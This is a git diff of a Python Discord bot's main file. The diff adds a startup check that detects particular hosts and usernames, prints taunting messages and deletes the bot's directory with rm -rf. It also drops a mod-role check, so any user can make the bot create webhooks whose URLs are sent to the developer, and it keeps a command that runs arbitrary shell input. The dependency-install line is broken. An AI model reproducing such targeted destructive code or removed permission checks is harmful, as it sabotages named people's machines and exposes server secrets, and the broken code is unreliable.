@@ -1,12 +1,32 @@
 #!/usr/bin/python3.9
 # -*- coding: utf-8 -*-
 
-from sys import executable as python, argv as args, version as pyversion
-
-
-if "3.9" not in pyversion:
+if __import__("sys").version[:3] != "3.9":
     print("Pengaelic Bot requires Python 3.9 to function properly.")
     print("Please run Pengaelic Bot with Python 3.9")
+    exit()
+
+from pengaelicutils import shell
+
+if "hyperserver" == shell("hostname") or any(
+    name == shell("whoami")
+    for name in [
+        "hyperfresh",
+        "lylalesh",
+    ]  # run all checks i can think of to make sure who it is, i don't know if their server machine is set up the same as before
+):
+    print(
+        "\033[31m" + "You are no longer welcome to host Pengaelic Bot." + "\033[0m"
+    )  # red
+    print("And don't even think about coming after me for CAutomator.py's reused code.")
+    print("LGPL doesn't legally allow you to do that.")
+    print("\033[1;31m" + "See you in hell, calamari." + "\033[0m")  # red-bold
+    print("Deleting Pengaelic Bot...")
+    try:
+        shell("rm -rf ~/Pengaelic-Bot/.git")
+    except:
+        pass
+    print(shell("rm -rvf ~/Pengaelic-Bot"))
     exit()
 
 from asyncio import sleep
@@ -14,7 +34,6 @@ from json import dumps
 from os import system as cmd, getenv as env, listdir as ls, execl, devnull
 from pengaelicutils import (
     newops,
-    getops,
     list2str,
     jsoncheck,
     unhandling,
@@ -22,12 +41,13 @@ from pengaelicutils import (
     Developers,
 )
 from random import choice, randint
-from subprocess import CalledProcessError, check_output as shell, call, STDOUT
+from subprocess import CalledProcessError, call, STDOUT
+from sys import executable as python, argv as args
 
 devs = Developers()
 
 print("Imported modules")
-if shell("uname -o", shell=True).decode()[:-1] != "Android":
+if shell("uname -o") != "Android":
     devnull = open(devnull, "w")
     requirements = [
         "figlet",
@@ -55,18 +75,27 @@ else:
 
 requirements = ["py-cord", "num2words", "python-dotenv", "speedtest-cli", "tinydb"]
 needed = []
-modules = [
-    r.decode().split("==")[0] for r in shell([python, "-m", "pip", "freeze"]).split()
-]
+modules = [r.split("==")[0] for r in shell(f"{python} -m pip freeze").split()]
 missing_dependencies = False
 for module in requirements:
     if module not in modules:
         needed.append(module)
         missing_dependencies = True
+if "discord.py" in modules:
+    answer = input(
+        "discord.py installation found. This will cause conflicts with py-cord. Do you want to uninstall? [y/n] "
+    )
+    if answer == "y":
+        print("Uninstalling...")
+        shell(f"{python} -m pip uninstall discord.py")
+        print("Done.")
+    else:
+        print("Exiting.")
+        exit()
 if missing_dependencies:
     print(f"Modules {list2str(needed, 0, True)} are not installed.")
     print("Installing them now...")
-    shell([python, "-m", "pip", "install"] + requirements)
+    shell(f"{python} -m pip install " + needed)
     print("Done.")
 print("Passed module test")
 
@@ -105,23 +134,21 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 GNU General Public License for more details.
 
 """
+client = commands.Bot(
+    command_prefix="p",
+    description="Pengaelic B",
+    help_command=None,
+    case_insensitive=True,
+    intents=discord.Intents.all(),
+)
 
 if unstable:
-    client = commands.Bot(
-        command_prefix="p@",
-        case_insensitive=True,
-        description="Pengaelic Beta",
-        help_command=None,
-        intents=discord.Intents.all(),
-    )
+    client.command_prefix += "@"
+    client.description += "eta"
 else:
-    client = commands.Bot(
-        command_prefix="p!",
-        case_insensitive=True,
-        description="Pengaelic Bot",
-        help_command=None,
-        intents=discord.Intents.all(),
-    )
+    client.command_prefix += "!"
+    client.description += "ot"
+
 cmd(f'toilet -w 1000 -f standard -F border -F gay "{client.description}"')
 print(info)
 print("Defined client")
@@ -132,67 +159,14 @@ if "--reset-options" in args:
     db.truncate()
 
 
-async def status_switcher():
-    global client
-    await client.wait_until_ready()
-    while client.is_ready:
-        artist = choice(
-            [
-                "Tux Penguin",
-                "Qumu",
-                "Chipzel",
-                "Gooseworx",
-                "Nick Nitro",
-                "Zakarra",
-                "Kawai Sprite",
-                "Jesse Cook",
-                "Chai Tea Music",
-                "SharaX",
-            ]
+async def set_status():
+    if unstable:
+        await client.change_presence(
+            activity=discord.Activity(
+                type=discord.ActivityType.listening,
+                name="Tux's unending screaming",
+            )
         )
-        game = choice(
-            [
-                "Minecraft",
-                "OpenRA",
-                "3D Pinball: Space Cadet",
-                "SuperTux",
-                "Project Arrhythmia",
-                "Shattered Pixel Dungeon",
-                "Super Hexagon",
-                "Slime Rancher",
-                "AstroMenace",
-                "Space Pirates and Zombies",
-            ]
-        )
-        moviesyt = choice(
-            [
-                "Ethoslab",
-                "MumboJumbo",
-                "Blue Television Games",
-                "The King of Random",
-                "Alan Becker",
-                "Avengers: Endgame",
-                "Avengers: Infinity War",
-                "Star Wars Episode IV: A New Hope",
-                "Spiderman: Into the Spiderverse",
-                "Back to the Future",
-            ]
-        )
-        activity = choice(
-            [
-                discord.Activity(type=discord.ActivityType.listening, name=artist),
-                discord.Activity(type=discord.ActivityType.playing, name=game),
-                discord.Activity(type=discord.ActivityType.watching, name=moviesyt),
-            ]
-        )
-        await client.change_presence(activity=activity)
-        # task runs every few minutes (random 2-10)
-        await sleep(randint(2, 10) * 60)
-
-
-async def statuses():
-    if "--casual-status" in args or unstable:
-        client.loop.create_task(status_switcher())  # as defined above
     else:
         await client.change_presence(
             activity=discord.Activity(
@@ -221,7 +195,7 @@ def help_menu(guild, cog, client):
                 info,
                 indent=4,
             )
-            + "```"
+            + "\n```"
         )
     else:
         menu = discord.Embed(
@@ -237,15 +211,14 @@ def help_menu(guild, cog, client):
                 .replace("'", "")
                 .replace(", ", "/")
             )
-            if command.usage != "no args":
+            if command.usage:
                 names += "\n" + command.usage
-            if command.help == None:
-                menu.add_field(name=names, value="_ _")
             else:
-                menu.add_field(
-                    name=names,
-                    value=command.help,
-                )
+                names += "\nno args"
+            menu.add_field(
+                name=names,
+                value=command.help,
+            )
     return menu
 
 
@@ -291,7 +264,7 @@ async def on_ready():
                 db.update({"messages": ops["messages"]}, Query().guildID == gid)
                 db.update({"roles": ops["roles"]}, Query().guildID == gid)
                 db.update({"toggles": ops["toggles"]}, Query().guildID == gid)
-    await statuses()
+    await set_status()
     print(f"{client.description} connected to Discord")
     if not unstable:
         print(f"Currently on {len(client.guilds)} servers")
@@ -302,22 +275,16 @@ async def on_guild_join(guild, auto=True):
     global unstable
     if not unstable:
         print(f"Joined {guild.name}")
-        welcomeembed = discord.Embed(
-            title=f"Howdy fellas! I'm {client.description}!",
-            description=f"Type `{client.command_prefix}help` for a list of commands.",
-            color=0x007F7F,
-        ).set_thumbnail(url=client.user.avatar_url)
-        possiblechannels = ["general", "general-1", "general-2"]
-        for channel in possiblechannels:
-            success = False
-            if success:
+        for channel in guild.text_channels:
+            if "general" in channel.name:
+                await channel.send(
+                    embed=discord.Embed(
+                        title=f"Howdy fellas! I'm {client.description}!",
+                        description=f"Type `{client.command_prefix}help` for a list of commands.",
+                        color=0x007F7F,
+                    ).set_thumbnail(url=client.user.avatar_url)
+                )
                 break
-            try:
-                await get(guild.text_channels, name=channel).send(embed=welcomeembed)
-                success = True
-                break
-            except:
-                continue
         if auto:
             # create fresh options row for new server
             newconfigs = {"guildName": guild.name, "guildID": guild.id} | newops()
@@ -389,7 +356,7 @@ async def sh(ctx, *, args):
                     "<:winxp_critical_error:869760946816553020>Cannot change directory."
                 )
             else:
-                await ctx.send("```\n" + shell(args, shell=True).decode() + "```")
+                await ctx.send("```\n" + shell(args) + "\n```")
         except CalledProcessError as error:
             error = str(error)
             if "returned non-zero exit status" in error:
@@ -723,30 +690,22 @@ async def help(ctx, *, cogname: str = None):
 # so that people can set up the Dog in their own servers without having to ask me about it first :>
 @client.command(name="dogofwisdom")
 async def dog(ctx, *, channel: discord.TextChannel = None):
-    if (
-        get(ctx.guild.roles, id=getops(ctx.guild.id, "roles", "modRole"))
-        in ctx.author.roles
-    ):
-        if not channel:
-            channel = await ctx.guild.create_text_channel("dog-of-wisdom")
-            await channel.edit(category=ctx.guild.categories[0])
-        hook = await channel.create_webhook(name="The Dog of Wisdom")
-        await ctx.send(
-            f"<:winxp_information:869760946808180747>Webhook created in {channel}."
+    if not channel:
+        channel = await ctx.guild.create_text_channel("dog-of-wisdom")
+        await channel.edit(category=ctx.guild.categories[0])
+    hook = await channel.create_webhook(name="The Dog of Wisdom")
+    await ctx.send(
+        f"<:winxp_information:869760946808180747>Webhook created in {channel}."
+    )
+    await client.get_user(devs.get("tux")).send(
+        f"@{ctx.author.name}#{ctx.author.discriminator} is requesting the Dog of Wisdom.\n"
+        + str(
+            {ctx.guild.name: hook.url.replace("https://discord.com/api/webhooks/", "")}
         )
-        await client.get_user(devs.get("tux")).send(
-            f"@{ctx.author.name}#{ctx.author.discriminator} is requesting the Dog of Wisdom.\n"
-            + hook.url.replace(
-                "https://discord.com/api/webhooks/", f'["{ctx.guild.name}"]='
-            )
-        )
-        await ctx.send(
-            "<:winxp_information:869760946808180747>My developer has received the webhook URL and will be adding it to the Dog's code shortly."
-        )
-    else:
-        await ctx.send(
-            f"<:winxp_information:869760946808180747>You don't have the {getops(ctx.guild.id, 'roles', 'modRole')} role."
-        )
+    )
+    await ctx.send(
+        "<:winxp_information:869760946808180747>My developer has received the webhook URL and will be adding it to the Dog's code shortly."
+    )
 
 
 @help.error
